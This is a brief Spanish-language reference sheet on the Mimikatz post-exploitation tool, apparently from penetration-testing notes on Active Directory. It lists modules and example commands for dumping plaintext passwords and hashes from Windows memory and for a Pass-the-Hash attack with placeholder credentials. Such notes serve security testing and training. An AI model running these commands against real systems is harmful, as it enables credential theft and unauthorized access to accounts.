### **Explotación de Active Directory/Mimikatz.md**

# Mimikatz

## Descripción

`Mimikatz` es una herramienta de post-explotación utilizada para extraer credenciales de memoria en sistemas Windows. Permite obtener contraseñas en texto plano, hashes, PINs y tickets Kerberos, facilitando ataques como Pass-the-Hash y Pass-the-Ticket.

## Uso

```bash
mimikatz [comandos]
```

### Opciones principales

- `privilege::debug`: Obtiene privilegios de depuración necesarios.
- `sekurlsa::logonpasswords`: Extrae las contraseñas de los usuarios.
- `kerberos::tickets`: Gestiona los tickets Kerberos.
- `sekurlsa::pth`: Realiza ataques Pass-the-Hash.
- `exit`: Salir de Mimikatz.

## Ejemplos

- Iniciar Mimikatz y obtener privilegios de depuración:
  
  ```bash
  mimikatz.exe
  privilege::debug
  ```

- Extraer contraseñas de los usuarios:
  
  ```bash
  sekurlsa::logonpasswords
  ```

- Realizar un ataque Pass-the-Hash:
  
  ```bash
  sekurlsa::pth /user:usuario /domain:dominio /ntlm:HASH
  ```
